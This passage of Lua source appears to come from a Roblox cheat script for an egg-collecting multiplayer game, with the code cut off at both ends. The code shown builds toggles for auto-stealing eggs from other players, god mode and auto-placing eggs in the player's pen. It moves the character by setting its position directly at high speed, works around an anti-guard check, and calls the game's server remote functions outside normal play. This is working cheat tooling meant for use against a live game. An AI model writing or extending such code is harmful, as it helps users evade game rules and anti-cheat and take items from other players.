				stealPlanCancel[uidArg] = nil
				eggCooldowns[uidArg] = nil
				local shouldRestart = ensureAutoStealOn() and isAutoStealRunning and not chilliState.Steal.Carrying and targetUid ~= uidArg

				if shouldRestart then
					shouldRestart = not (targetUid and stealPlanQueue[targetUid])
				end

				if shouldRestart then
					restartStealSession()
				end

				taskScheduler.Wake()
			end
		end

		trackCleanup(function()
			chilliState.GodMode(false)
			chilliState.ReleaseMovement("steal")
			cleanupSteal()
		end)

		chilliState.UiQueue = {}

		chilliState.UiDefer = function(arg)
			table.insert(chilliState.UiQueue, arg)
		end

		chilliState.Notify = function(arg, arg2)
			if type(chilliLib) == "table" and type(chilliLib.Notify) == "function" then
				pcall(chilliLib.Notify, arg, arg2, 5)
			end
		end

		local connection = RunService.Heartbeat:Connect(function()
			local uiQueue = chilliState.UiQueue
			if #uiQueue == 0 then
				return
			end
			chilliState.UiQueue = {}

			for _, uiFunc in ipairs(uiQueue) do
				pcall(uiFunc)
			end
		end)

		trackCleanup(function()
			pcall(function()
				connection:Disconnect()
			end)
		end)

		chilliState.Rift = { Requirements = {}, At = 0, Busy = false, Next = 0, Handles = {}, Restart = {} }

		chilliState.RiftOn = function(riftKey)
			local riftToggle = chilliState.Rift.Handles[riftKey]
			return riftToggle ~= nil and chilliState.Toggle(riftToggle, false) == true
		end

		do
			local maxCategoryCacheSize = 8

			local function getAssetCategory(categoryId)
				local directory = gameModules.Assets and gameModules.Assets.Directory
				local categoryData = type(directory) == "table" and directory[tostring(categoryId)] or nil
				return type(categoryData) == "table" and categoryData or nil
			end

			chilliState.EggRarity = function(eggData)
				local categoryData = getAssetCategory(eggData.AssetCategory)
				local rarityVal = categoryData and categoryData.Rarity or nil
				local isTable = type(rarityVal) == "table"

				if isTable then
					rarityVal = tonumber(rarityVal.RarityNumber or rarityVal.Rank)
				end

				return rarityVal or 0
			end

			chilliState.EggIncome = function(eggData)
				local categoryData = getAssetCategory(eggData.AssetCategory)
				local baseRate = categoryData and tonumber(categoryData.EarningRate) or 0
				local eggScale = tonumber(eggData.AssetScale) or 0
				if eggScale <= 0 then
					return 0
				end
				local scaleMultiplier = eggScale > 5 and (eggScale / 5) ^ 1.2 * 19.637875755794113 or eggScale ^ 1.85
				local mutations = gameModules.Mutations
				local hasMutations = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
				local mutationMultiplier = 1

				if hasMutations then
					local ok
					ok, mutationMultiplier = pcall(mutations.EarningsFor, type(eggData.Mutations) == "table" and eggData.Mutations or {})
					local isMutationValid = ok and type(mutationMultiplier) == "number"
					local defaultMutation = 1

					if not isMutationValid then
						mutationMultiplier = defaultMutation
					end
				end

				return baseRate * scaleMultiplier * mutationMultiplier
			end

			chilliState.RiftShortfall = function()
				local shortfallList = {}

				for _, requirement in ipairs(chilliState.Rift.Requirements) do
					shortfallList[requirement] = (shortfallList[requirement] or 0) + 1
				end

				if next(shortfallList) == nil then
					return shortfallList
				end
				local saveModule = gameModules.Save
				local hasSaveGet = type(saveModule) == "table" and type(saveModule.Get) == "function"
				local saveData = nil

				if hasSaveGet then
					local ok
					ok, saveData = pcall(saveModule.Get)
					saveData = ok and type(saveData) == "table" and saveData or nil
				end

				if not saveData then
					return {}
				end
				local equippedSet = {}
				local pairsFn = pairs
				local equippedAssets = saveData.EquippedAssets or {}

				for _, equippedAsset in pairsFn(equippedAssets) do
					equippedSet[equippedAsset] = true
				end

				local pairsFn2 = pairs
				local inventory = saveData.Inventory or {}

				for uid, invData in pairsFn2(inventory) do
					local categoryStr = type(invData) == "table" and tostring(invData.Category) or nil
					local isValidForRift

					if categoryStr then
						isValidForRift = (shortfallList[categoryStr] or 0) > 0
					else
						isValidForRift = categoryStr
					end

					isValidForRift = isValidForRift and invData.InFuse ~= true and invData.IsFavorite ~= true and not equippedSet[uid]

					if isValidForRift then
						shortfallList[categoryStr] = shortfallList[categoryStr] - 1
					end
				end

				for uid, remaining in pairs(shortfallList) do
					if remaining <= 0 then
						shortfallList[uid] = nil
					end
				end

				return shortfallList
			end

			local function isAnyRiftOn()
				for k in pairs(chilliState.Rift.Handles) do
					if chilliState.RiftOn(k) then
						return true
					end
				end

				return false
			end

			taskScheduler.Add(function()
				local riftState = chilliState.Rift
				local isBusy = riftState.Busy

				if not isBusy then
					local nextCheck = riftState.Next
					isBusy = os.clock() < nextCheck
				end

				if isBusy or not isAnyRiftOn() then
					return false
				end
				riftState.Busy = true
				riftState.Next = os.clock() + 8

				task.spawn(function()
					local rfTradeInAskState = networking:FindFirstChild("RF/ScrambleTradeIn/AskState")

					if rfTradeInAskState and rfTradeInAskState:IsA("RemoteFunction") then
						local ok, stateData = pcall(rfTradeInAskState.InvokeServer, rfTradeInAskState)

						if ok and type(stateData) == "table" then
							local reqs = {}

							if stateData.Unlocked == true and type(stateData.Requirements) == "table" then
								for _, requirement in ipairs(stateData.Requirements) do
									table.insert(reqs, tostring(requirement))
								end
							end

							riftState.Requirements = reqs
							riftState.At = os.clock()
						end
					end

					riftState.Busy = false
					taskScheduler.Wake()
				end)

				return false
			end)
		end

		local placeEggRules
		placeEggRules = { "Always", "Steal Idle", "After Steal", "Night Only" }
		local placeEggOrders
		placeEggOrders = { "Biggest Size", "Highest Value", "Smallest Size", "Backpack Order" }
		local currentPlaceRule
		currentPlaceRule = placeEggRules[1]
		local currentPlaceOrder
		currentPlaceOrder = placeEggOrders[2]
		local placeEggRarities
		placeEggRarities = {}
		local placeEggWhitelist
		placeEggWhitelist = {}
		local minPlaceEggValue
		minPlaceEggValue = 0

		do
			local function refreshPlaceEggSettings()
				if type(chilliState.PlaceEggRefresh) == "function" then
					chilliState.PlaceEggRefresh()
				end
			end

			local function keysFromList(list)
				local validKeys = {}

				if type(list) == "table" then
					for key, val in pairs(list) do
						key = val == true and type(key) == "string" and key or type(val) == "string" and val or nil

						if key then
							table.insert(validKeys, key)
						end
					end
				end

				return validKeys
			end

			chilliState.PlaceEggStatusRow = autoPlaceSection:CreateText({ Name = "Pen Status", Text = "Pen status unknown" })

			chilliState.PlaceEggHandle = autoPlaceSection:CreateToggle({
				Name = "Auto Place Egg",
				Default = false,
				Callback = function()
					if type(chilliState.PlaceEggRestart) == "function" then
						chilliState.PlaceEggRestart()
					end
				end,
			})

			local placeEggToggleObj = chilliState.PlaceEggHandle

			autoPlaceSection:CreateDropdown({
				Name = "Place Egg Rule",
				Options = placeEggRules,
				Default = placeEggRules[1],
				SubOf = placeEggToggleObj,
				Callback = function(val)
					if table.find(placeEggRules, val) then
						currentPlaceRule = val
					end
				end,
			})

			autoPlaceSection:CreateDropdown({
				Name = "Place Egg Order",
				Options = placeEggOrders,
				Default = placeEggOrders[2],
				SubOf = placeEggToggleObj,
				Callback = function(val)
					if table.find(placeEggOrders, val) then
						currentPlaceOrder = val
					end
				end,
			})

			local rarityOptions = {}

			for i = 2, #filterRarities do
				table.insert(rarityOptions, filterRarities[i])
			end

			if #rarityOptions > 0 then
				hookDropdownAllLabel(autoPlaceSection:CreateMultiDropdown({
					Name = "Place Rarities",
					Note = "Only place eggs of the picked rarities (empty = all)",
					Options = rarityOptions,
					Default = {},
					SubOf = placeEggToggleObj,
					Callback = function(val)
						local newFilterList = {}

						for _, rarityName in ipairs(keysFromList(val)) do
							local rarityInt = rarityValues[rarityName]

							if rarityInt and rarityInt > 0 then
								newFilterList[rarityInt] = true
							end
						end

						placeEggRarities = newFilterList
						refreshPlaceEggSettings()
					end,
				}))
			end

			local whitelistOptions = {}
			local whitelistToCategoryMap = {}
			local assetsDir = gameModules.Assets and gameModules.Assets.Directory
			local sortedEggs = {}

			if type(assetsDir) == "table" then
				for catId, catData in pairs(assetsDir) do
					local rarityVal = type(catData) == "table" and catData.Rarity or nil
					local rarityNum = type(rarityVal) == "table"

					if rarityNum then
						rarityNum = tonumber(rarityVal.RarityNumber or rarityVal.Rank)
					end

					rarityNum = rarityNum or nil

					if rarityNum then
						local insert = table.insert
						local eggInfo = { Category = tostring(catId) }
						local tostr = tostring
						catId = catData.DisplayName or catId
						eggInfo.Name = tostr(catId)
						eggInfo.Rarity = rarityNum
						eggInfo.RarityName = tostring(rarityVal.DisplayName or rarityVal._id or rarityNum)
						insert(sortedEggs, eggInfo)
					end
				end
			end

			table.sort(sortedEggs, function(e1, e2)
				if e1.Rarity ~= e2.Rarity then
					return e1.Rarity > e2.Rarity
				end
				return e1.Name < e2.Name
			end)

			for _, eggInfo in ipairs(sortedEggs) do
				local eggLabel = string.format("%s [%s]", eggInfo.Name, eggInfo.RarityName)

				if whitelistToCategoryMap[eggLabel] then
					eggLabel = string.format("%s [%s] (%s)", eggInfo.Name, eggInfo.RarityName, eggInfo.Category)
				end

				table.insert(whitelistOptions, eggLabel)
				whitelistToCategoryMap[eggLabel] = eggInfo.Category
			end

			if #whitelistOptions > 0 then
				hookDropdownAllLabel(autoPlaceSection:CreateMultiDropdown({
					Name = "Place Specific Eggs",
					Note = "Only place these eggs (empty = all)",
					Options = whitelistOptions,
					Default = {},
					SubOf = placeEggToggleObj,
					Callback = function(val)
						local validWhitelist = {}

						for _, keyStr in ipairs(keysFromList(val)) do
							if whitelistToCategoryMap[keyStr] then
								validWhitelist[whitelistToCategoryMap[keyStr]] = true
							end
						end

						placeEggWhitelist = validWhitelist
						refreshPlaceEggSettings()
					end,
				}))
			end

			local multiplierMap = {
				["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
				["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
				["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
			}

			local lastNumValue = 0
			local lastSuffixValue = "M/s"

			local function updateMinPlaceValue(num, suffix)
				if num ~= nil then
					lastNumValue = math.max(0, math.floor(tonumber(num) or lastNumValue))
				end

				if suffix ~= nil then
					lastSuffixValue = tostring(suffix)
				end

				minPlaceEggValue = lastNumValue * (multiplierMap[lastSuffixValue] or multiplierMap["M/s"]).Mult
			end

			formatNumberSuffix(autoPlaceSection, {
				Name = "Min Place Value",
				Note = "Skip eggs worth less than this (0 = off)",
				SubOf = placeEggToggleObj,
				Legacy = "Place Min Value",
				SectionName = "Auto Place Egg",
				OnRaw = function(val)
					updateMinPlaceValue(math.floor(val / 1000), "K/s")
				end,
			})
		end

		do
			local eggSpacing = 5
			local placeDistTether = 26
			local refreshWaitTime = 6
			local placeRetries = 8
			local nextPlaceTime = 0
			local penCapacity = 30
			local placeFailWait = 12
			local autoPlaceHandle = nil
			local autoPlaceStatusUI = nil
			local placeStatus = "Pen status unknown"
			local isPlacingEgg = false
			local penEggCache = {}
			local penEggCacheExpiry = 0
			local cachedPenState = nil
			local flyHeightOffset = 30

			local function invokeRemote(rfName, invokeArg)
				local rfObj = networking:FindFirstChild(rfName)
				if not rfObj or not rfObj:IsA("RemoteFunction") then
					return false, nil
				end
				return pcall(rfObj.InvokeServer, rfObj, invokeArg)
			end

			local function getAssetCategoryForEgg(eggData)
				local directory = gameModules.Assets and gameModules.Assets.Directory
				local categoryData = type(directory) == "table" and directory[tostring(eggData.AssetCategory)] or nil
				return type(categoryData) == "table" and categoryData or nil
			end

			local function getEggRarity(eggData)
				local rarityVal = getAssetCategoryForEgg(eggData)
				rarityVal = rarityVal and rarityVal.Rarity or nil
				local isTable = type(rarityVal) == "table"
				local num

				if isTable then
					num = tonumber(rarityVal.RarityNumber or rarityVal.Rank)
				else
					num = rarityVal
				end

				return num or 0
			end

			local function getEggIncome(eggData)
				local baseRate = getAssetCategoryForEgg(eggData)
				baseRate = baseRate and tonumber(baseRate.EarningRate) or 0
				local eggScale = tonumber(eggData.AssetScale) or 0
				if eggScale <= 0 then
					return 0
				end
				local scaleMultiplier = eggScale > 5 and (eggScale / 5) ^ 1.2 * 19.637875755794113 or eggScale ^ 1.85
				local mutations = gameModules.Mutations
				local hasMutations = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
				local mutationMultiplier = 1

				if hasMutations then
					local ok
					ok, mutationMultiplier = pcall(mutations.EarningsFor, type(eggData.Mutations) == "table" and eggData.Mutations or {})
					ok = ok and type(mutationMultiplier) == "number"
					local defaultMultiplier = 1

					if not ok then
						mutationMultiplier = defaultMultiplier
					end
				end

				return baseRate * scaleMultiplier * mutationMultiplier
			end

			local function getBackpackEggs()
				local eggList = {}
				local backpack = localPlayer:FindFirstChildOfClass("Backpack")
				if not backpack then
					return eggList
				end
				local idxCount = 0

				for _, child in ipairs(backpack:GetChildren()) do
					local uidStr = child:GetAttribute("UID")

					if type(uidStr) == "string" then
						idxCount += 1
						eggList[uidStr] = idxCount
					end
				end

				return eggList
			end

			local function getPlacableEggs()
				local allEggs = getOwnerEggs()
				if type(allEggs) ~= "table" then
					return {}
				end
				local backpackEggs = getBackpackEggs()
				local shortfallList = {}

				if chilliState.RiftOn("Place") then
					shortfallList = chilliState.RiftShortfall()

					for _, eggData in pairs(allEggs) do
						if type(eggData) == "table" and eggData.Placement ~= nil then
							local catStr = tostring(eggData.AssetCategory)

							if (shortfallList[catStr] or 0) > 0 then
								shortfallList[catStr] = shortfallList[catStr] - 1
							end
						end
					end
				end

				local placableEggs = {}

				for uid, eggData in pairs(allEggs) do
					if type(eggData) == "table" and eggData.Placement == nil and not penEggCache[uid] then
						local eggIncome = getEggIncome(eggData)
						local catStr = tostring(eggData.AssetCategory)
						local isRarityOk = next(placeEggRarities) == nil or placeEggRarities[getEggRarity(eggData)] == true
						local isWhitelistOk = next(placeEggWhitelist) == nil or placeEggWhitelist[catStr] == true
						local isValueOk = minPlaceEggValue <= 0 or eggIncome >= minPlaceEggValue
						local isRiftOk = (shortfallList[catStr] or 0) > 0

						if isRiftOk then
							shortfallList[catStr] = shortfallList[catStr] - 1
						end

						if isRiftOk then
							isValueOk = isRiftOk
						else
							isValueOk = isRarityOk and isWhitelistOk and isValueOk
						end

						if isValueOk then
							table.insert(placableEggs, {
								Uid = uid,
								Scale = tonumber(eggData.AssetScale) or 0,
								Income = eggIncome,
								Slot = backpackEggs[uid] or math.huge,
								Rift = isRiftOk,
							})
						end
					end
				end

				table.sort(placableEggs, function(e1, e2)
					if e1.Rift ~= e2.Rift then
						return e1.Rift
					end

					if currentPlaceOrder == placeEggOrders[2] and e1.Income ~= e2.Income then
						return e1.Income > e2.Income
					end

					if currentPlaceOrder == placeEggOrders[3] and e1.Scale ~= e2.Scale then
						return e1.Scale < e2.Scale
					end

					if currentPlaceOrder == placeEggOrders[4] and e1.Slot ~= e2.Slot then
						return e1.Slot < e2.Slot
					end
					return e1.Scale > e2.Scale
				end)

				return placableEggs
			end

			local function shouldPlaceEgg(capRemaining)
				if capRemaining == 0 then
					return false
				end
				local stealState = chilliState.Steal
				if currentPlaceRule == placeEggRules[2] then
					return not stealState.Active and not stealState.Carrying
				end

				if currentPlaceRule == placeEggRules[3] then
					local isAfterStealOk = stealState.LastFinishedAt > 0

					if isAfterStealOk then
						local lastFinishedAt = stealState.LastFinishedAt
						isAfterStealOk = os.clock() - lastFinishedAt <= placeFailWait
					end

					return isAfterStealOk
				end

				if currentPlaceRule == placeEggRules[4] then
					return chilliState.IsNight()
				end
				return true
			end

			local function getPenCapacityRemaining()
				local allEggs = getOwnerEggs()
				local placedCount = 0

				if type(allEggs) == "table" then
					for _, eggData in pairs(allEggs) do
						if type(eggData) == "table" and eggData.Placement ~= nil then
							placedCount += 1
						end
					end
				end

				local saveModule = gameModules.Save
				local saveData = nil

				if type(saveModule) == "table" then
					local peekFunc = saveModule.Peek or saveModule.Get
					if type(peekFunc) == "function" then
						local ok, res = pcall(peekFunc, localPlayer)
						saveData = ok and type(res) == "table" and res or nil
					end
				end

				local hasEquipped = saveData and type(saveData.EquippedAssets) == "table"
				local equippedCount = 0

				if hasEquipped then
					for k in pairs(saveData.EquippedAssets) do
						equippedCount += 1
					end
				end

				local basesModule = safeRequire(function()
					return ReplicatedStorage.Data.Bases
				end)

				local hasCapacityFunc = type(basesModule) == "table" and type(basesModule.GetAssetEquipCapacity) == "function"
				local capacity = nil

				if hasCapacityFunc then
					local capResult
					local ok, res = pcall(basesModule.GetAssetEquipCapacity, saveData and tonumber(saveData.BaseUpgradeLevel) or 0)
					capacity = ok and tonumber(res) or nil
				end

				if not capacity then
					local rfWearLimit = networking:FindFirstChild("RF/PenRoster/AskWearLimit")

					if rfWearLimit and rfWearLimit:IsA("RemoteFunction") then
						local ok, res = pcall(rfWearLimit.InvokeServer, rfWearLimit)
						capacity = ok and tonumber(res) or nil
					end
				end

				capacity = capacity or 0
				return capacity - placedCount - equippedCount, capacity, placedCount, equippedCount
			end

			local gridOffsetX = -0.5
			local gridOffsetZ = -24

			local function getPlacedPositions()
				local allEggs = getOwnerEggs()
				local positions = {}
				if type(allEggs) ~= "table" then
					return positions
				end

				for _, eggData in pairs(allEggs) do
					local placement = type(eggData) == "table" and eggData.Placement or nil
					local localCFrame = type(placement) == "table" and placement.LocalCFrame or nil

					if typeof(localCFrame) == "CFrame" then
						table.insert(positions, Vector2.new(localCFrame.Position.X, localCFrame.Position.Z))
					end
				end

				return positions
			end

			local randomObj = Random.new()

			local function getAvailablePenPositions(occupiedPositions)
				local availablePositions = {}

				for x = gridOffsetZ, 8, 4 do
					for z = 4, 30, 4 do
						local testPos = Vector2.new(x, z)
						local isFree = true

						for _, occupiedPos in ipairs(occupiedPositions) do
							if (occupiedPos - testPos).Magnitude < eggSpacing then
								isFree = false
								break
							end
						end

						if isFree then
							table.insert(availablePositions, CFrame.new(x, gridOffsetX, z))
						end
					end
				end

				for idx = #availablePositions, 2, -1 do
					local randIdx = randomObj:NextInteger(1, idx)
					local temp = availablePositions[idx]
					availablePositions[idx] = availablePositions[randIdx]
					availablePositions[randIdx] = temp
				end

				return availablePositions
			end

			local function updatePenStatusStr()
				local capRemaining, capacity, placedCount, equippedCount = getPenCapacityRemaining()
				local allEggs = getOwnerEggs()
				local bagCount = 0

				if type(allEggs) == "table" then
					for _, eggData in pairs(allEggs) do
						if type(eggData) == "table" and eggData.Placement == nil then
							bagCount += 1
						end
					end
				end

				placeStatus = string.format("Eggs placed %d/%d  -  %d/%d pets equipped, %d in bag", placedCount, 30, equippedCount, capacity, bagCount)
				return capRemaining, placedCount
			end

			local function flyDirectTo(targetPos, cancelFunc)
				local currentRoot = chilliState.Root()
				if not currentRoot then
					return false
				end
				local position = currentRoot.Position
				local timeout = (targetPos - position).Magnitude / math.max(400, 1) + 3
				local flySuccess = nil
				local elapsed = 0

				local flyConn = RunService.Heartbeat:Connect(function(dt)
					if flySuccess ~= nil or chilliState.AntiGuard.Busy then
						return
					end
					elapsed += dt
					local innerRoot = chilliState.Root()
					if not innerRoot or (cancelFunc and cancelFunc()) or elapsed > timeout then
						flySuccess = false
						return
					end

					if (innerRoot.Position - position).Magnitude > 6 then
						position = innerRoot.Position
					end

					local diff = targetPos - position
					local stepDist = 400 * dt
					local reachedTarget = diff.Magnitude <= math.max(stepDist, 0.05)
					position = reachedTarget and targetPos or position + diff.Unit * stepDist
					local lookVector = Vector3.new(diff.X, 0, diff.Z)
					local rotCFrame = lookVector.Magnitude > 0.05 and CFrame.lookAt(Vector3.zero, lookVector.Unit) or innerRoot.CFrame.Rotation

					pcall(function()
						innerRoot.CFrame = CFrame.new(position) * rotCFrame
						innerRoot.AssemblyLinearVelocity = Vector3.zero
						innerRoot.AssemblyAngularVelocity = Vector3.zero
					end)

					if reachedTarget then
						flySuccess = true
					end
				end)

				while flySuccess == nil do
					RunService.Heartbeat:Wait()
				end

				flyConn:Disconnect()
				return flySuccess
			end

			local function getMiddleLineX()
				local worldFolder = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
				worldFolder = worldFolder and worldFolder:FindFirstChild("Areas")
				worldFolder = worldFolder and worldFolder:FindFirstChild("SeparationLine")
				return worldFolder and worldFolder:IsA("BasePart") and worldFolder.Position.X or 552
			end

			local flyToPositionSafe = nil

			local function getSafeWaypoint(targetPos)
				local currentRoot = chilliState.Root()
				if not currentRoot or type(chilliState.StealHome) ~= "function" then
					return nil
				end
				local midX = getMiddleLineX()
				if (currentRoot.Position.X < midX) == (targetPos.X < midX) then
					return nil
				end
				local ok, homePos = pcall(chilliState.StealHome)
				if not ok or typeof(homePos) ~= "Vector3" then
					return nil
				end

				if (homePos - targetPos).Magnitude <= 12 or (currentRoot.Position - homePos).Magnitude <= 12 then
					return nil
				end
				return homePos
			end

			flyToPositionSafe = function(targetPos, cancelFunc, shieldName, skipWaypoint)
				local currentRoot = chilliState.Root()
				if not currentRoot then
					return false
				end

				if not skipWaypoint then
					local waypoint = getSafeWaypoint(targetPos)
					if waypoint and not flyToPositionSafe(waypoint, cancelFunc, shieldName, true) then
						return false
					end

					if cancelFunc and cancelFunc() then
						return false
					end
					currentRoot = chilliState.Root()
					if not currentRoot then
						return false
					end
				end

				chilliState.Shield(shieldName or "place", true)
				chilliState.Driving = chilliState.Driving + 1
				task.wait(0.2)
				local targetUp = targetPos + Vector3.new(0, 3, 0)
				local flyHeight = math.max(currentRoot.Position.Y, targetUp.Y) + flyHeightOffset

				local ok, success = pcall(function()
					return flyDirectTo(Vector3.new(currentRoot.Position.X, flyHeight, currentRoot.Position.Z), cancelFunc) and flyDirectTo(Vector3.new(targetUp.X, flyHeight, targetUp.Z), cancelFunc) and flyDirectTo(targetUp, cancelFunc)
				end)

				ok = ok and success == true
				chilliState.Driving = math.max(0, chilliState.Driving - 1)
				chilliState.Shield(shieldName or "place", false)
				return ok
			end

			chilliState.FlyTo = function(targetPos, cancelFunc, shieldName)
				return flyToPositionSafe(targetPos, cancelFunc, shieldName or "fly")
			end

			local function placeEggLoopTick()
				local eggState = gameModules.EggState
				if type(eggState) ~= "table" or type(eggState.PlantEgg) ~= "function" then
					return false
				end
				local placableEggs = getPlacableEggs()
				if not shouldPlaceEgg(#placableEggs) then
					return false
				end
				updatePenStatusStr()
				local capRemaining, capacity, placedCount = getPenCapacityRemaining()
				local availableSlots = penCapacity - (tonumber(placedCount) or 0)
				if availableSlots <= 0 then
					return false
				end
				local penAnchor = chilliState.PenAnchor()
				if not penAnchor then
					return false
				end
				chilliState.Movement.PlaceWanted = true
				if not chilliState.ClaimMovement("place") then
					return "waiting"
				end
				local cacheStamp = penEggCacheExpiry

				local function isPlaceCancelled()
					if cacheStamp ~= penEggCacheExpiry or not chilliState.Toggle(autoPlaceHandle, false) then
						return true
					end

					if chilliState.IsNight() then
						return false
					end
					return currentPlaceRule == placeEggRules[4] or chilliState.Movement.StealFirst
				end

				if chilliState.Treadmill.Riding or chilliState.OnBelt() then
					chilliState.ExitBelt()
				end

				local function flyToPen()
					chilliState.HoldBelt()
					local ok, result = pcall(flyToPositionSafe, penAnchor, isPlaceCancelled)
					chilliState.ReleaseBelt()
					return ok and result and true or false
				end

				if placeDistTether < chilliState.DistanceTo(penAnchor) then
					placeStatus = "Flying to the pen"

					if not flyToPen() then
						chilliState.LeaveBelt()
						nextPlaceTime = os.clock() + refreshWaitTime
						return false
					end
				end

				chilliState.LeaveBelt()
				if isPlaceCancelled() then
					return false
				end

				local function ensureAtPen()
					if chilliState.DistanceTo(penAnchor) <= placeDistTether then
						return true
					end

					if isPlaceCancelled() then
						return false
					end
					placeStatus = "Pen out of reach, flying back"
					return flyToPen() and chilliState.DistanceTo(penAnchor) <= placeDistTether
				end

				if not ensureAtPen() then
					placeStatus = "Could not reach the pen, trying again soon"
					nextPlaceTime = os.clock() + refreshWaitTime
					return false
				end

				local occupiedPositions = getPlacedPositions()
				local placedThisLoop = 0
				local failCount = 0

				for _, placableEgg in ipairs(placableEggs) do
					if not (placedThisLoop >= availableSlots or isPlaceCancelled()) then
						if not ensureAtPen() then
							placeStatus = "Pen out of reach, stopping this pass"
							break
						else
							local ok, result = pcall(eggState.WearEggTool, placableEgg.Uid)

							if ok and result ~= false then
								task.wait(0.15)
								local retryCount = 0
								local placedCurrent = false

								for _, placePos in ipairs(getAvailablePenPositions(occupiedPositions)) do
									if not (isPlaceCancelled() or retryCount >= placeRetries) then
										retryCount += 1
										local askPlaceReq, askPlaceRes = invokeRemote("RF/EggWorld/AskPlaceEgg", { Uid = placableEgg.Uid, LocalCFrame = placePos })

										if askPlaceReq and askPlaceRes ~= false then
											table.insert(occupiedPositions, Vector2.new(placePos.Position.X, placePos.Position.Z))
											placedThisLoop += 1
											placedCurrent = true
											break
										else
											continue
										end
									end

									break
								end

								if placedCurrent then
									failCount = 0
									continue
								else
									penEggCache[placableEgg.Uid] = true
									failCount += 1
									if not (failCount >= 2) then
										continue
									end
								end
							else
								penEggCache[placableEgg.Uid] = true
								continue
							end
						end
					end

					break
				end

				if type(eggState.DoffEggTool) == "function" then
					pcall(eggState.DoffEggTool)
				end

				if placedThisLoop == 0 then
					nextPlaceTime = os.clock() + refreshWaitTime
				end

				return placedThisLoop > 0
			end

			taskScheduler.Add(function()
				local capRemaining, capacity = updatePenStatusStr()

				if autoPlaceStatusUI and type(autoPlaceStatusUI.Set) == "function" then
					pcall(autoPlaceStatusUI.Set, autoPlaceStatusUI, placeStatus)
				end

				local numCap = tonumber(capacity)
				local didCapDecrease = numCap ~= nil and cachedPenState ~= nil and numCap < cachedPenState

				if numCap then
					cachedPenState = numCap
				end

				if didCapDecrease then
					table.clear(penEggCache)
				end

				if not chilliState.Toggle(autoPlaceHandle, false) then
					chilliState.Movement.PlaceWanted = false
					chilliState.ReleaseMovement("place")
					return false
				end

				if isPlacingEgg then
					return false
				end

				if os.clock() < nextPlaceTime then
					chilliState.Movement.PlaceWanted = false
					return false
				end

				if chilliState.Movement.StealFirst and not chilliState.IsNight() then
					chilliState.Movement.PlaceWanted = false
					return false
				end
				isPlacingEgg = true

				task.spawn(function()
					local ok, result = pcall(placeEggLoopTick)

					if not (ok and result == "waiting") then
						chilliState.Movement.PlaceWanted = false
					end

					chilliState.ReleaseMovement("place")
					isPlacingEgg = false
					taskScheduler.Wake()
				end)

				return false
			end)

			autoPlaceHandle = chilliState.PlaceEggHandle
			autoPlaceStatusUI = chilliState.PlaceEggStatusRow

			chilliState.PlaceEggRestart = function()
				table.clear(penEggCache)
				penEggCacheExpiry += 1
				chilliState.StopWalking()
				taskScheduler.Wake()
			end

			chilliState.PlaceEggRefresh = function()
				table.clear(penEggCache)
				taskScheduler.Wake()
			end

			chilliState.Rift.Restart.Place = function()
				table.clear(penEggCache)
				taskScheduler.Wake()
			end
		end

		local saveModule = gameModules.Save

		if type(saveModule) == "table" and type(saveModule.FieldSignal) == "function" then
			for _, fieldStr in ipairs({ "EggInventory", "EquippedAssets", "BaseUpgradeLevel" }) do
				local ok, fieldSig = pcall(saveModule.FieldSignal, fieldStr)

				if ok and type(fieldSig) == "table" and type(fieldSig.Connect) == "function" then
					local ok2, conn = pcall(fieldSig.Connect, fieldSig, function()
						taskScheduler.Wake()
					end)

					if ok2 and conn then
						trackCleanup(function()
							pcall(function()
								conn:Disconnect()
							end)
						end)
					end
				end
			end
		end

		chilliState.Steal.HeldByMe = function()
			local carryUid = chilliState.Steal.CarryUid
			local character = localPlayer.Character
			if type(carryUid) ~= "string" or not character then
				return false
			end
			local eggModel = workspace:FindFirstChild(carryUid)
			if not eggModel then
				return false
			end

			for _, descendant in ipairs(eggModel:GetDescendants()) do
				if descendant:IsA("WeldConstraint") or descendant:IsA("JointInstance") then
					local ok, p0, p1 = pcall(function()
						return descendant.Part0, descendant.Part1
					end)

					if ok and (p0 and p0:IsDescendantOf(character) or p1 and p1:IsDescendantOf(character)) then
						return true
					end
				end
			end

			return false
		end

		do
			local carryCheckElapsed = 0

			local carryConn = RunService.Heartbeat:Connect(function(dt)
				carryCheckElapsed += dt
				if carryCheckElapsed < 0.2 then
					return
				end
				carryCheckElapsed = 0
				local stealState = chilliState.Steal

				if not stealState.Carrying then
					if stealState.GuessedDrop then
						local ok, isHeld = pcall(stealState.HeldByMe)

						if ok and isHeld then
							stealState.GuessedDrop = false
							stealState.Carrying = true
							stealState.HeldSeenAt = os.clock()
						end
					end

					return
				end

				local ok, isHeld = pcall(stealState.HeldByMe)
				if not ok or isHeld then
					stealState.HeldSeenAt = os.clock()
					return
				end

				if os.clock() - (stealState.HeldSeenAt or 0) > 0.8 then
					stealState.Carrying = false
					stealState.GuessedDrop = true
					stealState.LastFinishedAt = os.clock()
					taskScheduler.Wake()
				end
			end)

			trackCleanup(function()
				pcall(function()
					carryConn:Disconnect()
				end)
			end)
		end

		do
			local eggState = gameModules.EggState
			local carryChangedEvent = type(eggState) == "table" and eggState.CarryChanged or nil

			if type(carryChangedEvent) == "table" and type(carryChangedEvent.Connect) == "function" then
				local ok, conn = pcall(carryChangedEvent.Connect, carryChangedEvent, function(carryInfo)
					local isCarrying = type(carryInfo) == "table" and carryInfo.IsCarrying == true

					if chilliState.Steal.Carrying and not isCarrying then
						chilliState.Steal.LastFinishedAt = os.clock()
					end

					chilliState.Steal.GuessedDrop = false

					if isCarrying then
						chilliState.Steal.HeldSeenAt = os.clock()
					end

					if isCarrying and type(carryInfo.Uid) == "string" then
						chilliState.Steal.CarryUid = carryInfo.Uid
						chilliState.Steal.CarryAreaId = carryInfo.AreaId
						local speedMult = tonumber(carryInfo.SpeedMultiplier)

						if speedMult and speedMult > 0 then
							chilliState.SafeCarry.Mult = speedMult
							chilliState.SafeCarry.Category = carryInfo.AssetCategory

							if carryInfo.AssetCategory ~= nil then
								local catStr = tostring(carryInfo.AssetCategory)
								chilliState.SafeCarry.Seen[catStr] = math.min(chilliState.SafeCarry.Seen[catStr] or speedMult, speedMult)
							end
						end
					end

					chilliState.Steal.Carrying = isCarrying
					taskScheduler.Wake()
				end)

				if ok and conn then
					trackCleanup(function()
						pcall(function()
							conn:Disconnect()
						end)
					end)
				end
			end
		end

		pcall(function()
